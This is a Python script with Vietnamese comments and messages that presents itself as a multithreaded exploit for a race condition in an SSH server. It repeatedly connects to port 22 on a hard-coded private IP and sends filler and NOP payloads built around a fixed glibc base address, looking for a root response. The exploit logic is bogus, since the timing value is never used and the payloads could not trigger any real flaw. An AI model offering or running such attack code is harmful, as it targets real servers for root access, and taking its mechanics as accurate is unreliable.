import socket
import time
import struct
import threading

TARGET_IP = "192.168.1.100"
TARGET_PORT = 22
MAX_ATTEMPTS = 10000
NUM_THREADS = 10

def setup_connection(ip, port):
    """Thiết lập kết nối đến mục tiêu."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    return sock

def perform_ssh_handshake(sock):
    """Thực hiện bắt tay SSH với mục tiêu."""
    banner = sock.recv(1024).decode()
    sock.sendall(b"SSH-2.0-Exploit\r\n")
    return banner

def prepare_heap(sock):
    """Chuẩn bị để khai thác."""
    payload = b"\x00" * 1000
    sock.sendall(payload)

def attempt_race_condition(sock, timing, glibc_base):
    """Cố gắng kích hoạt điều kiện."""
    try:
        payload = struct.pack("<Q", glibc_base) + b"\x90" * 100
        sock.sendall(payload)
        sock.sendall(b"exit\r\n")
        response = sock.recv(1024)
        return b"root" in response
    except Exception as e:
        print(f"Lỗi trong quá trình thử điều kiện đầu vào: {e}")
        return False

def exploit_attempt(timing_adjustment, success_event):
    """Thực hiện một luồng duy nhất để khai thác."""
    sock = setup_connection(TARGET_IP, TARGET_PORT)
    if not sock:
        return

    banner = perform_ssh_handshake(sock)
    print(f"Received banner: {banner.strip()}")

    prepare_heap(sock)
    time.sleep(0.1)

    success = attempt_race_condition(sock, time.time() + timing_adjustment, 0xb7400000)
    if success:
        print(f"Khai thác thành công!")
        success_event.set()
    else:
        print(f"Khai thác thất bại.")
        timing_adjustment += 0.00001

    sock.close()

def main():
    success_event = threading.Event()
    timing_adjustment = 0

    threads = []
    for attempt in range(MAX_ATTEMPTS):
        if success_event.is_set():
            break

        for _ in range(NUM_THREADS):
            if success_event.is_set():
                break

            thread = threading.Thread(target=exploit_attempt, args=(timing_adjustment, success_event))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()

    if success_event.is_set():
        print("Khai thác thành công!")
    else:
        print("Khai thác không thành công.")

if __name__ == "__main__":
    main()
